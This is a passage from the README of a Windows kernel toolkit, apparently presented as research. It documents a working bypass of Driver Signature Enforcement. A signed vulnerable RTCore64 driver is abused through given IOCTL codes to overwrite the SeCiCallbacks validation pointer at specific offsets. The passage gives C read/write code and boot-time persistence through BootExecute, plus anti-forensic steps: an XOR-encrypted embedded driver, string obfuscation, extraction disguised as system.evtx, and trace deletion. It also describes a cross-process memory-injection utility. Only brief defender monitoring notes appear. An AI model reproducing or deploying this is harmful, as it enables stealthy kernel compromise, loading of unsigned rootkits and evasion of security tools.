Project Path: arc_wesmar_KernelResearchKit_bw04tg09
    Note over BootBypass,Kernel: Restore original callback...
    
    BootBypass->>Kernel: NtUnloadDriver(RTCore64)
    BootBypass->>Filesystem: Delete system.evtx
    BootBypass->>Registry: Delete Services\RTCore64
    
    Note over BootBypass: Cleanup complete, no traces
```

---

### Component 5: Vulnerable Driver (RTCore64.sys)

Signed vulnerable driver from Micro-Star International with unrestricted kernel memory read/write capabilities. **This driver is embedded in the application resources and extracted at runtime** - it is not distributed as a separate file.

**Driver Metadata:**
```
Original Name: RTCore64.sys
Company: Micro-Star International
Size: 14,024 bytes (embedded XOR-encrypted in IDR_DRV resource)
Certificate: Valid code-signing certificate (Microsoft-trusted CA)
```

**IOCTL Interface:**
```c
// Hardcoded IOCTL codes (cannot be changed - driver implementation)
#define IOCTL_READ  0x80002048  // CTL_CODE for physical memory read
#define IOCTL_WRITE 0x8000204C  // CTL_CODE for physical memory write

typedef struct _RTC_PACKET {
    UCHAR pad0[8];
    ULONGLONG addr;    // Target kernel address (NO VALIDATION!)
    UCHAR pad1[8];
    ULONG size;        // Always 4 bytes (driver ignores this field)
    ULONG value;       // Value to read/write
    UCHAR pad3[16];
} RTC_PACKET;
```

**Device Path:**
```
\Device\RTCore64    → Created by driver on load
\??\RTCore64        → Symbolic link to device
```

**Vulnerability Properties:**
- ❌ No address validation (accepts any kernel-space pointer)
- ❌ No privilege checking beyond device open (any user can open device)
- ❌ No range restrictions (entire kernel address space accessible)
- ✅ Valid code-signing certificate (loads without DSE bypass)
- ✅ Loads on Windows 10/11 with default settings

**Memory Operations:**
```c
// SecurityPatcher.c

BOOLEAN WriteMemory32(HANDLE hDriver, ULONGLONG address, ULONG value, ULONG ioctl) {
    RTC_PACKET packet;
    IO_STATUS_BLOCK iosb;
    
    memset_impl(&packet, 0, sizeof(packet));
    packet.addr = address;   // Target kernel address (e.g., SeCiCallbacks+0x20)
    packet.size = 4;
    packet.value = value;    // New callback pointer (low/high DWORD)
    
    NTSTATUS status = NtDeviceIoControlFile(hDriver, NULL, NULL, NULL, &iosb,
                                           ioctl, &packet, sizeof(packet),
                                           &packet, sizeof(packet));
    
    return NT_SUCCESS(status);
}

BOOLEAN WriteMemory64(HANDLE hDriver, ULONGLONG address, ULONGLONG value, ULONG ioctl) {
    // Decompose 64-bit write into two 32-bit operations
    if (!WriteMemory32(hDriver, address, (ULONG)(value & 0xFFFFFFFF), ioctl))
        return FALSE;
    if (!WriteMemory32(hDriver, address + 4, (ULONG)((value >> 32) & 0xFFFFFFFF), ioctl))
        return FALSE;
    return TRUE;
}

BOOLEAN ReadMemory64(HANDLE hDriver, ULONGLONG address, ULONGLONG* value, ULONG ioctl) {
    RTC_PACKET packet;
    IO_STATUS_BLOCK iosb;
    ULONG low, high;
    
    // Read low DWORD
    memset_impl(&packet, 0, sizeof(packet));
    packet.addr = address;
    packet.size = 4;
    NtDeviceIoControlFile(hDriver, NULL, NULL, NULL, &iosb,
                         ioctl, &packet, sizeof(packet),
                         &packet, sizeof(packet));
    low = packet.value;
    
    // Read high DWORD
    memset_impl(&packet, 0, sizeof(packet));
    packet.addr = address + 4;
    packet.size = 4;
    NtDeviceIoControlFile(hDriver, NULL, NULL, NULL, &iosb,
                         ioctl, &packet, sizeof(packet),
                         &packet, sizeof(packet));
    high = packet.value;
    
    *value = ((ULONGLONG)high << 32) | (ULONGLONG)low;
    return TRUE;
}
```

**Usage in DSE Bypass:**
```c
NTSTATUS ExecuteAutoPatchLoad(PINI_ENTRY entry, PCONFIG_SETTINGS config, PULONGLONG originalCallback) {
    HANDLE hDriver;
    ULONGLONG ntBase, callbackToPatch, safeFunction, currentCallback;
    
    // Extract and load vulnerable driver
    ExtractOmniDriverFromResource();  // XOR-decrypt from resources
    PWSTR driverName = MmGetPoolDiagnosticString();  // Decode "RTCore64"
    LoadDriver(driverName, OmniDriver_Log, L"KERNEL", L"SYSTEM");
    
    // Open device handle
    hDriver = OpenDriverDevice(L"\\Device\\RTCore64");
    
    // Calculate target address
    ntBase = GetNtoskrnlBase();  // Query via NtQuerySystemInformation
    callbackToPatch = ntBase + config->Offset_SeCiCallbacks + config->Offset_Callback;
    safeFunction = ntBase + config->Offset_SafeFunction;
    
    // Read current callback
    ReadMemory64(hDriver, callbackToPatch, &currentCallback, config->IoControlCode_Read);
    
    // Save original callback
    *originalCallback = currentCallback;
    SaveStateSection(currentCallback);  // Persist to drivers.ini
    
    // Patch DSE callback
    WriteMemory64(hDriver, callbackToPatch, safeFunction, config->IoControlCode_Write);
    
    // Load unsigned driver (DSE bypassed!)
    LoadDriver(entry->ServiceName, entry->ImagePath, entry->DriverType, entry->StartType);
    
    // Restore original callback
    WriteMemory64(hDriver, callbackToPatch, *originalCallback, config->IoControlCode_Write);
    
    // Cleanup
    NtClose(hDriver);
    UnloadDriver(driverName);
    CleanupOmniDriver();  // Delete system.evtx and registry keys
    
    return STATUS_SUCCESS;
}
```
**Why This Driver?**

1. **Legitimate Signature** - Loads without DSE bypass (chicken-and-egg problem solved)
2. **No Dependencies** - Pure kernel-mode, no user-mode service required
3. **Simple Interface** - Single IOCTL with trivial packet structure
4. **Wide Availability** - Found on many systems (MSI motherboard utilities)
5. **Small Size** - 14KB embeds easily in resources without bloating binary

**Detection Considerations:**

✅ **Driver hash** is publicly known (VirusTotal, threat intel feeds)  
✅ **Device name** `\Device\RTCore64` is IoC (Indicator of Compromise)  
✅ **IOCTL codes** 0x80002048/0x8000204C are fingerprints  

❌ **String obfuscation** hides driver name in static analysis  
❌ **XOR encryption** changes resource hash (embedded binary ≠ original driver hash)  
❌ **Temporary extraction** to `system.evtx` evades filename-based detection  
❌ **Automatic cleanup** removes all traces after operations  

**Mitigation by Defenders:**
```powershell
# Monitor for device creation (requires kernel driver/ETW)
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Kernel-PnP/Device Configuration'; ID=400} |
    Where-Object { $_.Message -match 'RTCore64' }

# Block vulnerable driver loading via WDAC/AppLocker
# Driver hash: [original RTCore64.sys hash]
# Note: Won't catch XOR-encrypted embedded version

# Monitor IOCTL operations (behavioral detection)
# Look for 0x80002048/0x8000204C to \Device\RTCore64

# File system monitoring
# Alert on: C:\Windows\system.evtx creation (non-standard event log location)
```

---

### Component 6: OmniDriver & OmniUtility (Demonstration Payload)

With DSE bypassed, the framework can load unsigned kernel drivers. OmniDriver serves as a demonstration payload showcasing production-grade kernel memory operations.

**OmniDriver.sys** - Unsigned kernel driver with safe cross-process memory access.

**Safety Features:**
- **Process Context Switching**: Uses `KeStackAttachProcess()` for safe address space switching
- **Structured Exception Handling**: `__try/__except` blocks prevent BSOD from invalid memory access
- **Memory Probing**: `ProbeForRead`/`ProbeForWrite` validate addresses before operations
- **Intermediate Buffering**: Never performs direct cross-process copies (allocates non-paged buffer)
- **Proper Resource Cleanup**: Guaranteed cleanup even during exceptions

**IOCTL Interface:**
```c
#define IOCTL_READWRITE_DRIVER_READ  0x80000800  // CTL_CODE custom
#define IOCTL_READWRITE_DRIVER_WRITE 0x80000804  // CTL_CODE custom

typedef struct _READWRITE_REQUEST {
    DWORD ProcessId;      // Target process ID
    ULONG_PTR Address;    // Virtual address in target process
    ULONG_PTR Buffer;     // Buffer in caller's process
    SIZE_T Size;          // Transfer size (max 16KB)
    BOOLEAN Write;        // FALSE=read, TRUE=write
    NTSTATUS Status;      // Operation result (output)
} READWRITE_REQUEST;
```

**OmniUtility.exe** - Demonstration application showcasing kernel capabilities:

**Features:**
1. **Universal Window Title Modification** - Changes all visible window titles simultaneously
2. **Direct Text Injection** - Injects text into Notepad buffers (clipboard + kernel write methods)
3. **Module Base Finder** - Enumerates all loaded modules in any process with base addresses
4. **Cross-Process Memory Operations** - Read/write arbitrary process memory via kernel driver

**Example Usage:**
```cmd
# Load OmniDriver via BootBypass (AutoPatch=YES in drivers.ini)
# OR manually after DSE bypass:
sc create OmniDriver binPath= C:\Windows\System32\drivers\OmniDriver.sys type= kernel
sc start OmniDriver

# Launch demonstration tool
OmniUtility.exe

Menu:
[1] Modify all window titles (demonstrates kernel-level window manipulation)
[2] Inject text into Notepad (demonstrates cross-process write)
[3] Find module bases (demonstrates process enumeration)
[0] Exit
```

**Technical Demonstration Value:**

OmniDriver showcases critical kernel programming concepts:
- Safe kernel-mode memory operations (no crashes despite invalid user input)
- Cross-process communication without `ReadProcessMemory`/`WriteProcessMemory` (direct kernel access)
- Exception-safe resource management in kernel context
- Proper privilege elevation and security context handling

---

## 🔬 Technical Deep Dive

### The ZwFlushInstructionCache Technique

Core innovation: replacing `CiValidateImageHeader` callback with `ZwFlushInstructionCache` - a benign kernel function with compatible signature and always-success behavior.

**Signature Compatibility:**
```
CiValidateImageHeader:        ZwFlushInstructionCache:
  RCX: ImageBase                RCX: ProcessHandle (ignored)
  RDX: ImageSize                RDX: BaseAddress (ignored)
  R8:  Flags                    R8:  Length (ignored)
  R9:  ImageInfo                (not used)
  Return: NTSTATUS              Return: STATUS_SUCCESS (always)
```

**Memory Layout:**
```
ntoskrnl.exe @ 0xFFFFF80000000000 (KASLR randomized base)

.text section:
  +0x69C1B0 = ZwFlushInstructionCache    ← Replacement function
  +0xA1B2C0 = CiValidateImageHeader      ← Original callback

.data section:
  +0xF04740 = SeCiCallbacks table base
    +0x20 = CiValidateImageHeader pointer ← PATCH TARGET
```

**Patching Operation:**
```
Target Address = ntBase + 0xF04740 + 0x20
Original Value = 0xFFFFF80000A1B2C0 (CiValidateImageHeader)
New Value      = 0xFFFFF8000069C1B0 (ZwFlushInstructionCache)

Performed via:
  WriteMemory64(hDriver, callbackToPatch, safeFunction, IOCTL_WRITE)
```

**Consequences:**
- Signature validation skipped (callback never invokes validation logic)
- All driver loads return `STATUS_SUCCESS`
- CI state flags remain unchanged (`g_CiEnabled` still TRUE)
- No event logs generated (validation "passes")
- Stealth: appears as legitimate CI operation to security tools

**Why This Works:**
- Single function pointer modified (not kernel code)
- `SeCiCallbacks` table not protected by PatchGuard (data, not code)
- `ZwFlushInstructionCache` has identical calling convention
- Always returns success regardless of input
- System stability maintained (no crashes or corruption)

**Kernel Structures (Simplified):**
```c
// ntoskrnl.exe internal structures (not documented, reverse-engineered)

typedef NTSTATUS (*PCI_VALIDATE_IMAGE_HEADER)(
    PVOID ImageBase,
    ULONG ImageSize,
    ULONG Flags,
    PVOID ImageInfo
);

typedef struct _CI_CALLBACKS {
    PVOID Reserved1;
    PVOID Reserved2;
    PVOID Reserved3;
    PVOID Reserved4;
    PCI_VALIDATE_IMAGE_HEADER CiValidateImageHeader;  // +0x20 offset
    PVOID Reserved5;
    // ... more callbacks ...
} CI_CALLBACKS, *PCI_CALLBACKS;

// Global variable in ntoskrnl.exe .data section
CI_CALLBACKS g_CiCallbacks;  // @ ntBase + 0xF04740

// Original validation function
NTSTATUS CiValidateImageHeader(
    PVOID ImageBase,
    ULONG ImageSize,
    ULONG Flags,
    PVOID ImageInfo
) {
    // Check digital signature
    // Verify certificate chain
    // Validate PE headers
    // Check revocation lists
    // ...
    return signature_valid ? STATUS_SUCCESS : STATUS_INVALID_IMAGE_HASH;
}

// Replacement function (benign kernel API)
NTSTATUS ZwFlushInstructionCache(
    HANDLE ProcessHandle,   // Ignored
    PVOID BaseAddress,      // Ignored
    SIZE_T Length           // Ignored
) {
    // Flush CPU instruction cache (no-op on x64 with strong memory ordering)
    return STATUS_SUCCESS;  // ALWAYS succeeds
}
```

**Detection Bypass:**

Traditional DSE bypass detection looks for:
1. **`g_CiEnabled` flag modification** - This technique doesn't touch it
2. **`g_CiOptions` modification** - This technique doesn't touch it
3. **Kernel code patching** - This technique only modifies data (function pointer)

What defenders should monitor:
1. **`SeCiCallbacks` structure integrity** - callback pointer validation
2. **Suspicious driver loads** - unsigned drivers appearing after boot
3. **Vulnerable driver presence** - detect RTCore64/other known vulnerable drivers
4. **IOCTL operations** - monitor 0x80002048/0x8000204C to suspicious devices

---

## 🚀 Quick Start
Prerequisites
Required:

Windows 10/11 x64 (tested on Windows 11 25H2 Build 26200)
Administrator privileges

Not Required:

Test Signing mode
Developer mode
Secure Boot disable (works with Secure Boot enabled)
Separate vulnerable driver file (embedded in application)

Method A: Boot-Time Deployment (Persistent)
Step 1: Deploy via PowerShell Script
powershell# Extract KernelResearchKit.7z (password: github.com)
# Navigate to extracted directory

# Right-click implementer.bat → Run as Administrator
# OR manually:
powershell -ExecutionPolicy Bypass -File implementer.ps1
```

**Interactive Menu:**
```
1. Deploy BootBypass (install to boot sequence)
2. Remove BootBypass (uninstall)
3. Exit
Deployment Actions:

Copies BootBypass.exe → C:\Windows\System32\
Copies drivers.ini → C:\Windows\
Creates registry backup: BootExecute_backup_YYYYMMDD_HHMMSS.reg
Adds BootExecute entry: HKLM\...\Session Manager\BootExecute = "BootBypass"

Note: RTCore64.sys is NOT copied - it's embedded in BootBypass.exe and extracted at runtime.
Step 2: Configure Operations
Edit C:\Windows\drivers.ini with desired operations:
ini[Config]
Execute=YES              ; Master switch (NO=disable all operations)
RestoreHVCI=NO          ; Re-enable Memory Integrity after operations

# Kernel offsets (Windows 11 25H2 Build 26200)
# Update these after Windows updates using drvloader.exe Option 2
Offset_SeCiCallbacks=0xF04740
Offset_Callback=0x20
Offset_SafeFunction=0x69C1B0

[Driver1]
Action=LOAD
AutoPatch=YES           ; Full DSE bypass cycle per driver
ServiceName=mydriver
ImagePath=\SystemRoot\System32\drivers\mydriver.sys
Type=KERNEL
StartType=DEMAND
CheckIfLoaded=YES
Step 3: Reboot
cmdshutdown /r /t 0
Verification After Reboot:
powershell# Check drivers.ini modification time (updated by BootBypass)
Get-ItemProperty C:\Windows\drivers.ini | Select-Object LastWriteTime

# Check if target driver loaded
sc query mydriver

# Check for DSE state (should be clean - no traces)
Get-Content C:\Windows\drivers.ini | Select-String "DSE_STATE"  # Should return nothing

Method B: Runtime Manipulation (Interactive)
Step 1: Launch drvloader
cmd# Run as Administrator
drvloader.exe
```

**Step 2: Handle HVCI Detection**

If Memory Integrity (HVCI) is enabled, drvloader will display:
```
[!] WARNING: Memory Integrity (HVCI) is enabled!
[!] DSE bypass will succeed, but loading unsigned drivers will cause BSOD.
[!] Do you want to disable Memory Integrity and reboot? (Y/N):
